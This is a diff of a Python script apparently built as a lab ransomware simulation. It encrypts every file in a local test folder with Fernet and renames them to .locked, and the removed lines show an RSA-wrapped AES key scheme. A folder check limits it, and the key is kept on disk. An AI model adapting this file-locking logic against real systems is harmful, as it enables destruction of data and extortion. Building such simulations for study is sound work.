@@ -1,93 +1,57 @@
-"""
-Hybrid Ransomware Attack Simulation (Educational)
-
-Safety notes:
-- This script only encrypts files inside the local test_folder directory.
-- It is intended for controlled lab environments only.
-"""
+"""Encrypt files in ../test_folder using Fernet and rename them to .locked."""
 
 from pathlib import Path
-from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.primitives.asymmetric import padding, rsa
 
-BASE_DIR = Path(__file__).resolve().parent.parent
-TEST_FOLDER = BASE_DIR / "test_folder"
-BACKUP_FOLDER = BASE_DIR / "backup"
-PUBLIC_KEY_PATH = BASE_DIR / "public.pem"
-PRIVATE_KEY_PATH = BASE_DIR / "private.pem"
-ENCRYPTED_AES_KEY_PATH = BASE_DIR / "simulator" / "encrypted_aes_key.bin"
+from cryptography.fernet import Fernet
+
+# simulator -> ../test_folder and ../logs style pathing from this script's folder.
+SIMULATOR_DIR = Path(__file__).resolve().parent
+TEST_FOLDER = (SIMULATOR_DIR / "../test_folder").resolve()
+KEY_PATH = SIMULATOR_DIR / "key.key"
 
 
 def is_inside_test_folder(path: Path) -> bool:
-    """Return True only when path is inside test_folder."""
+    """Safety check: only allow operations inside test_folder."""
     try:
-        path.resolve().relative_to(TEST_FOLDER.resolve())
+        path.resolve().relative_to(TEST_FOLDER)
         return True
     except ValueError:
         return False
 
 
-def generate_rsa_keys_if_missing() -> None:
-    """Create RSA key pair once and save it in project root."""
-    if PUBLIC_KEY_PATH.exists() and PRIVATE_KEY_PATH.exists():
+def ensure_test_folder_with_dummy_files() -> None:
+    """Create test_folder and 5 dummy files when it is empty."""
+    TEST_FOLDER.mkdir(parents=True, exist_ok=True)
+    existing_files = [p for p in TEST_FOLDER.iterdir() if p.is_file()]
+    if existing_files:
         return
 
-    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-    public_key = private_key.public_key()
-
-    PRIVATE_KEY_PATH.write_bytes(
-        private_key.private_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PrivateFormat.PKCS8,
-            encryption_algorithm=serialization.NoEncryption(),
+    for index in range(1, 6):
+        file_path = TEST_FOLDER / f"test{index}.txt"
+        file_path.write_text(
+            f"This is dummy test file {index}.\n",
+            encoding="utf-8",
         )
-    )
-
-    PUBLIC_KEY_PATH.write_bytes(
-        public_key.public_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PublicFormat.SubjectPublicKeyInfo,
-        )
-    )
+    print("test_folder was empty. Created 5 dummy files.")
 
 
-def encrypt_aes_key_with_rsa(aes_key: bytes) -> None:
-    """Encrypt AES key with RSA public key and store encrypted blob."""
-    public_key = serialization.load_pem_public_key(PUBLIC_KEY_PATH.read_bytes())
-    encrypted_aes_key = public_key.encrypt(
-        aes_key,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None,
-        ),
-    )
-    ENCRYPTED_AES_KEY_PATH.write_bytes(encrypted_aes_key)
+def load_or_create_key() -> bytes:
+    """Generate key.key once, then reuse it for all future runs."""
+    if KEY_PATH.exists():
+        return KEY_PATH.read_bytes()
 
-
-def backup_original_file(file_path: Path) -> None:
-    """Copy file bytes into backup folder before encryption for safer labs."""
-    relative_path = file_path.resolve().relative_to(TEST_FOLDER.resolve())
-    backup_path = BACKUP_FOLDER / relative_path
-    backup_path.parent.mkdir(parents=True, exist_ok=True)
-    backup_path.write_bytes(file_path.read_bytes())
+    key = Fernet.generate_key()
+    KEY_PATH.write_bytes(key)
+    print(f"Created key file: {KEY_PATH}")
+    return key
 
 
 def encrypt_files() -> None:
-    """Encrypt every file in test_folder and rename with .locked extension."""
-    if not TEST_FOLDER.exists():
-        print(f"test_folder not found: {TEST_FOLDER}")
-        return
-
-    generate_rsa_keys_if_missing()
-
-    aes_key = Fernet.generate_key()
-    encrypt_aes_key_with_rsa(aes_key)
-    cipher = Fernet(aes_key)
+    ensure_test_folder_with_dummy_files()
+    key = load_or_create_key()
+    cipher = Fernet(key)
 
     encrypted_count = 0
-
     for file_path in TEST_FOLDER.rglob("*"):
         if not file_path.is_file():
             continue
@@ -96,20 +60,17 @@ def encrypt_files() -> None:
         if not is_inside_test_folder(file_path):
             continue
 
-        backup_original_file(file_path)
-
         plaintext = file_path.read_bytes()
         encrypted_data = cipher.encrypt(plaintext)
+        file_path.write_bytes(encrypted_data)
 
-        locked_path = file_path.with_name(file_path.name + ".locked")
-        locked_path.write_bytes(encrypted_data)
-        file_path.unlink()
+        locked_path = file_path.with_name(f"{file_path.name}.locked")
+        file_path.rename(locked_path)
 
         encrypted_count += 1
         print(f"Encrypted: {file_path.name} -> {locked_path.name}")
 
     print(f"Encryption complete. Total files encrypted: {encrypted_count}")
-    print("AES key was encrypted using RSA and stored securely.")
 
 
 if __name__ == "__main__":
